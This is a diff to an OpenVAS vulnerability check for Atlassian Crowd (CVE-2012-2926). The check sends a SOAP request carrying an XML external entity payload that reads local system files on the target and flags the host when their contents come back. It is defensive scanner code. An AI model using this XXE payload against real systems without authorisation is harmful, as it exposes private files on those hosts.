@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_atlassian_crowd_53595.nasl 13659 2019-02-14 08:34:21Z cfischer $
+# $Id: gb_atlassian_crowd_53595.nasl 13835 2019-02-25 07:22:59Z cfischer $
 #
 # Atlassian Crowd XML Parsing Denial of Service Vulnerability
 #
@@ -25,6 +25,8 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
+CPE = "cpe:/a:atlassian:crowd";
+
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103512");
@@ -32,57 +34,67 @@ if(description)
   script_cve_id("CVE-2012-2926");
   script_tag(name:"cvss_base", value:"6.4");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
-  script_version("$Revision: 13659 $");
-
+  script_version("$Revision: 13835 $");
   script_name("Atlassian Crowd XML Parsing Denial of Service Vulnerability");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-25 08:22:59 +0100 (Mon, 25 Feb 2019) $");
+  script_tag(name:"creation_date", value:"2012-07-11 15:40:23 +0200 (Wed, 11 Jul 2012)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
+  script_dependencies("gb_atlassian_crowd_detect.nasl", "os_detection.nasl");
+  script_mandatory_keys("atlassian_crowd/installed");
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53595");
   script_xref(name:"URL", value:"https://jira.atlassian.com/browse/JRA-27719");
   script_xref(name:"URL", value:"http://www.atlassian.com/software/jira/");
   script_xref(name:"URL", value:"http://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2012-05-17");
 
-  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
-  script_tag(name:"creation_date", value:"2012-07-11 15:40:23 +0200 (Wed, 11 Jul 2012)");
-  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
-  script_family("Web application abuses");
-  script_tag(name:"solution_type", value:"VendorFix");
-  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
-  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
-  script_require_ports("Services/www", 8095);
-  script_exclude_keys("Settings/disable_cgi_scanning");
-
   script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");
-  script_tag(name:"summary", value:"Crowd before 2.0.9, 2.1 before 2.1.2, 2.2 before 2.2.9, 2.3 before 2.3.7, and 2.4
-before 2.4.1 do not properly restrict the capabilities of third-party XML parsers,
-which allows remote attackers to read arbitrary files or cause a denial of
-service (resource consumption) via unspecified vectors.");
+
+  script_tag(name:"summary", value:"Atlassian Crowd does not properly restrict the capabilities of third-party
+  XML parsers, which allows remote attackers to read arbitrary files or cause a denial of
+  service (resource consumption) via unspecified vectors.");
+
+  script_tag(name:"affected", value:"Crowd before 2.0.9, 2.1 before 2.1.2, 2.2 before 2.2.9, 2.3 before 2.3.7,
+  and 2.4 before 2.4.1.");
+
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"VendorFix");
 
   exit(0);
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
 include("misc_func.inc");
+include("host_details.inc");
 
-port = get_http_port(default:8095);
+if(!port = get_app_port(cpe:CPE, service:"www"))
+  exit(0);
 
-url = '/crowd/services';
+if(!dir = get_app_location(cpe:CPE, port:port))
+  exit(0);
+
+if(dir == "/")
+  dir = "";
+
+url = dir + "/crowd/services";
 req = http_get(item:url, port:port);
-buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
-if("Invalid SOAP request" >!< buf)exit(0);
+buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
+if(!buf || "Invalid SOAP request" >!< buf)
+  exit(0);
 
 files = traversal_files();
 useragent = http_get_user_agent();
 host = http_host_name(port:port);
 
-entity =  rand_str(length:8,charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
+entity = rand_str(length:8, charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
 
-foreach file (keys(files)) {
+foreach pattern (keys(files)) {
 
-  soap = '<!DOCTYPE foo [<!ENTITY ' + entity  + ' SYSTEM "file:///' + files[file]  + '"> ]>
+  file = files[pattern];
+
+  soap = '<!DOCTYPE foo [<!ENTITY ' + entity  + ' SYSTEM "file:///' + file + '"> ]>
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SecurityServer" xmlns:aut="http://authentication.integration.crowd.atlassian.com" xmlns:soap="http://soap.integration.crowd.atlassian.com">
 <soapenv:Header/>
 <soapenv:Body>
@@ -122,7 +134,6 @@ foreach file (keys(files)) {
 </soap:values>
 </soap:SOAPAttribute>
 </soap:attributes>';
-
   len = strlen(soap);
 
   req = string("POST ", url, " HTTP/1.1\r\n",
@@ -134,13 +145,12 @@ foreach file (keys(files)) {
                "\r\n",
                soap);
 
-  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
-  if(egrep(pattern:file, string:result)) {
-    security_message(port:port);
+  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
+  if(egrep(pattern:pattern, string:res)) {
+    report = report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
     exit(0);
   }
-
 }
 
-exit(0);
+exit(99);
